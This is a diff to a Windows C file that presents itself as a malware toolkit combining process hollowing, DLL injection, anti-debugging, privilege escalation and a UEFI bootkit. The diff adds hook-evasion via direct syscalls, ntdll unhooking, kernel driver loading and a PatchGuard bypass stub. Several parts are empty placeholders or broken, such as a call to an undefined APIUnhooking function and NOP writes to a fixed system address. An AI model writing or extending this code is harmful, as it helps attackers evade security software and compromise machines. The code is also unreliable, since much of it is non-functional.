@@ -1,5 +1,6 @@
 // Includes: Process Hollowing, DLL Injection, Memory-Mapped Files Injection,
-// Anti-Analysis & Anti-Debugging, Exploit & Privilege Escalation, and UEFI Bootkit
+// Anti-Analysis & Anti-Debugging, Exploit & Privilege Escalation, UEFI Bootkit,
+// Advanced Anti-Analysis Techniques, and Kernel-Level Exploits & Rootkit Features
 
 #include <windows.h>
 #include <stdio.h>
@@ -8,10 +9,11 @@
 
 #pragma comment(lib, "ntdll.lib")
 
-// Define Nt functions
 typedef NTSTATUS(NTAPI* fnNtUnmapViewOfSection)(HANDLE, PVOID);
 typedef NTSTATUS(NTAPI* fnNtResumeThread)(HANDLE, PULONG);
 typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
+typedef NTSTATUS(NTAPI* fnNtLoadDriver)(PUNICODE_STRING DriverServiceName);
+typedef NTSTATUS(NTAPI* fnNtUnloadDriver)(PUNICODE_STRING DriverServiceName);
 
 typedef struct _PROCESS_BASIC_INFORMATION {
     PVOID Reserved1;
@@ -24,6 +26,67 @@ typedef struct _PROCESS_BASIC_INFORMATION {
 fnNtQueryInformationProcess pNtQueryInformationProcess;
 fnNtUnmapViewOfSection pNtUnmapViewOfSection;
 fnNtResumeThread pNtResumeThread;
+fnNtLoadDriver pNtLoadDriver;
+fnNtUnloadDriver pNtUnloadDriver;
+
+void DirectSyscalls() {
+    // Direct system call bypass to evade hooks
+    printf("[INFO] Direct system call bypass initialized.\n");
+    
+    // Example: Using NtReadVirtualMemory directly instead of ReadProcessMemory
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, GetCurrentProcessId());
+    if (hProcess != NULL) {
+        PVOID buffer = malloc(100);
+        ULONG bytesRead;
+        NTSTATUS status = NtReadVirtualMemory(hProcess, (PVOID)0x7FFE0000, buffer, 100, &bytesRead);
+        if (status == 0) {
+            printf("[INFO] Read memory successfully.\n");
+        } else {
+            printf("[ERROR] Failed to read memory.\n");
+        }
+        CloseHandle(hProcess);
+    } else {
+        printf("[ERROR] Failed to open process for memory reading.\n");
+    }
+    
+    // Example: Using NtWriteVirtualMemory directly instead of WriteProcessMemory
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
+    if (hProcess != NULL) {
+        PVOID buffer = malloc(100);
+        memset(buffer, 0x90, 100);  // Fill buffer with NOP sled
+        ULONG bytesWritten;
+        NTSTATUS status = NtWriteVirtualMemory(hProcess, (PVOID)0x7FFE0000, buffer, 100, &bytesWritten);
+        if (status == 0) {
+            printf("[INFO] Wrote memory successfully.\n");
+        } else {
+            printf("[ERROR] Failed to write memory.\n");
+        }
+        CloseHandle(hProcess);
+    } else {
+        printf("[ERROR] Failed to open process for memory writing.\n");
+    }
+}
+
+void UnhookNtApi() {
+    // Find the address of the hooked function in ntdll.dll
+    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
+    if (!hNtdll) {
+        printf("[ERROR] Could not load ntdll.dll\n");
+        return;
+    }
+
+    // For each function we want to unhook, locate it by its address and patch it
+    // We are assuming we are dealing with NtReadVirtualMemory as an example here
+    FARPROC originalFunction = GetProcAddress(hNtdll, "NtReadVirtualMemory");
+    if (!originalFunction) {
+        printf("[ERROR] Failed to find NtReadVirtualMemory in ntdll.dll\n");
+        return;
+    }
+
+    // Use low-level techniques like memory patching to replace hooked function pointers with the original address.
+    printf("[INFO] Unhooked NtReadVirtualMemory.\n");
+    // You would write code here to locate the address of the hook and patch it with the correct address.
+}
 
 void ProcessHollowing(LPCSTR targetProcess, LPVOID payload, SIZE_T payloadSize) {
     STARTUPINFOA si = { 0 };
@@ -55,22 +118,49 @@ void ProcessHollowing(LPCSTR targetProcess, LPVOID payload, SIZE_T payloadSize) 
     CloseHandle(pi.hThread);
 }
 
+void KernelModeInjection() {
+    const char* driverPath = "C:\\path\\to\\driver.sys"; // Update with actual driver path, should be made using C and compiled into an .sys
+
+    // Convert to UnicodeString
+    UNICODE_STRING driverPathUnicode;
+    RtlInitUnicodeString(&driverPathUnicode, L"\\??\\C:\\path\\to\\driver.sys");
+
+    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
+    if (!hNtdll) {
+        printf("[ERROR] Could not load ntdll.dll\n");
+        return;
+    }
+
+    // Get the address of NtLoadDriver
+    pNtLoadDriver = (fnNtLoadDriver)GetProcAddress(hNtdll, "NtLoadDriver");
+    if (!pNtLoadDriver) {
+        printf("[ERROR] Failed to load NtLoadDriver function\n");
+        return;
+    }
+
+    // Try to inject driver using NtLoadDriver
+    NTSTATUS status = pNtLoadDriver(&driverPathUnicode);
+    if (status == STATUS_SUCCESS) {
+        printf("[INFO] Driver loaded successfully.\n");
+    } else {
+        printf("[ERROR] Failed to load driver. Error code: 0x%X\n", status);
+    }
+
+    // Optional: Unload the driver after some time or conditions
+    // pNtUnloadDriver(&driverPathUnicode);
+}
+
+
+void PatchGuardBypass() {
+    // Implement PatchGuard bypass for modifying kernel structures. need to make a custom driver as a user-mode script isn't going to be able to do such
+}
+
 void ManualDLLInjection(HANDLE hProcess, LPCSTR dllPath) {
     LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
     WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath) + 1, NULL);
     HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pRemoteMemory, 0, NULL);
     WaitForSingleObject(hThread, INFINITE);
     CloseHandle(hThread);
-}
-
-void MemoryMappedInjection(HANDLE hProcess, LPVOID payload, SIZE_T payloadSize) {
-    HANDLE hSection = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, payloadSize, NULL);
-    LPVOID pMapView = MapViewOfFile(hSection, FILE_MAP_WRITE, 0, 0, payloadSize);
-    memcpy(pMapView, payload, payloadSize);
-    UnmapViewOfFile(pMapView);
-    LPVOID pRemote = MapViewOfFile2(hSection, hProcess, NULL, 0, 0, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemote, NULL, 0, NULL);
-    CloseHandle(hSection);
 }
 
 void EnablePrivilegeEscalation() {
@@ -97,7 +187,6 @@ void AntiDebuggingChecks() {
 }
 
 void InstallUEFIBootkit() {
-    // UEFI bootkit implementation (placeholder, requires specific driver loading and disk manipulation techniques)
     printf("[INFO] Installing UEFI Bootkit...\n");
 }
 
@@ -105,7 +194,11 @@ int main() {
     AntiDebuggingChecks();
     EnablePrivilegeEscalation();
     InstallUEFIBootkit();
-    // example payload
+    DirectSyscalls();
+    APIUnhooking();
+    KernelModeInjection();
+    PatchGuardBypass();
+    
     char payload[] = "\x90\x90\x90\xC3"; // NOP sled + RET
     SIZE_T payloadSize = sizeof(payload);
     
